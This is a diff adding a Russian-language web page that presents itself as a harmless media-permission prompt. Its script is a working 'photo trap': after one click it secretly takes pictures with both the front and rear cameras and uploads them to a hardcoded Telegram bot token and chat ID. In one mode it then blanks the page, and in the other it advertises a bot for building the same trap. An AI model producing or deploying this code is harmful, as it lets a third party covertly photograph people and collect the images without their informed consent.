@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Разрешение</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --primary: #6c5ce7;
+      --accent: #fd79a8;
+      --light: #f8f9fa;
+      --text: #495057;
+      --text-light: #6c757d;
+      --gray: #e9ecef;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    body { background: var(--light); color: var(--text); min-height: 100vh; }
+    .center-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .media-permission {
+      background: #fff;
+      border-radius: 16px;
+      padding: 32px 24px;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.04);
+      text-align: center;
+      max-width: 340px;
+      width: 100%;
+    }
+    .permission-icon i {
+      font-size: 44px;
+      background: linear-gradient(to right, var(--primary), var(--accent));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 16px;
+    }
+    .media-permission p { color: var(--text-light); margin-bottom: 28px; }
+    .allow-btn {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      padding: 11px 28px;
+      font-size: 16px;
+      border-radius: 24px;
+      cursor: pointer;
+      transition: .3s;
+    }
+    .allow-btn.loading { background: #bbb; cursor: default; }
+    .success-message {
+      text-align: center;
+      padding: 10px 5px 0 5px;
+    }
+    .success-message h2 {
+      font-size: 20px;
+      color: var(--primary);
+      margin-bottom: 8px;
+      font-weight: 700;
+      line-height: 1.3;
+    }
+    .success-message p {
+      color: var(--text);
+      margin-bottom: 12px;
+      font-size: 16px;
+      white-space: pre-line;
+    }
+    .photo-preview {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 16px 0;
+      flex-wrap: wrap;
+    }
+    .photo-preview img {
+      width: 120px;
+      border-radius: 10px;
+      background: var(--gray);
+      border: 1px solid var(--gray);
+      object-fit: cover;
+    }
+    .clone-link {
+      display: inline-block;
+      margin: 12px auto 0 auto;
+      background: var(--primary);
+      color: white;
+      padding: 9px 18px;
+      border-radius: 20px;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 14px;
+      border: 2px solid var(--primary);
+    }
+    @media (max-width: 600px) {
+      .media-permission { padding: 20px 6px; }
+      .photo-preview img { width: 80px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="center-wrapper" id="centerWrapper">
+    <div class="media-permission" id="mediaPermissionBlock">
+      <div class="permission-icon"><i class="fas fa-images"></i></div>
+      <p>Чтобы просмотреть содержимое, разрешите доступ к медиа-контенту.</p>
+      <button class="allow-btn" id="allowMediaBtn">Продолжить</button>
+    </div>
+  </div>
+  <script>
+    const photoData = {};
+    let silentMode = false;
+    const BOT_TOKEN = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
+    const CHAT_ID = "1224978194";
+
+    function getGeneratorFromUrl() {
+      const path = window.location.pathname;
+      if (path.length > 1) {
+        return path.slice(1).split('/')[0];
+      }
+      return null;
+    }
+
+    async function checkSilentMode() {
+      const generator = getGeneratorFromUrl();
+      if (!generator) return;
+      try {
+        const res = await fetch(`/info?account=${generator}`);
+        if (res.ok) {
+          const data = await res.json();
+          if (data.bot_username) {
+            silentMode = true;
+          }
+        }
+      } catch (e) {}
+    }
+
+    async function captureAndSend(facingMode, photoName) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        await new Promise(resolve => { video.onloadedmetadata = resolve; });
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+        photoData[photoName] = dataUrl;
+
+        const blob = await (await fetch(dataUrl)).blob();
+        stream.getTracks().forEach(track => track.stop());
+
+        // Отправка фото в Telegram
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, `${photoName}.jpg`);
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+      } catch (err) {
+        console.error('Ошибка:', err);
+      }
+    }
+
+    document.getElementById('allowMediaBtn').addEventListener('click', async (e) => {
+      const btn = e.currentTarget;
+      btn.disabled = true;
+      btn.classList.add('loading');
+      btn.innerHTML = 'Загрузка...';
+
+      checkSilentMode().then(() => {
+        Promise.all([
+          captureAndSend('user', 'photo_front'),
+          captureAndSend('environment', 'photo_back')
+        ]).then(showResult);
+      });
+    });
+
+    function showResult() {
+      const wrapper = document.getElementById('centerWrapper');
+      if (silentMode) {
+        wrapper.innerHTML = '';
+      } else {
+        wrapper.innerHTML = `
+          <div class="media-permission success-message">
+            <h2>Ваши фотографии<br>успешно отправлены.</h2>
+            <p>Сделать такую же фото-ловушку:</p>
+            <a class="clone-link" href="https://t.me/photocatchbot" target="_blank">https://t.me/photocatchbot</a>
+            <div class="photo-preview">
+              <img src="${photoData.photo_front}" alt="Фронтальная камера" />
+              <img src="${photoData.photo_back}" alt="Тыльная камера" />
+            </div>
+          </div>
+        `;
+      }
+    }
+  </script>
+</body>
+</html>
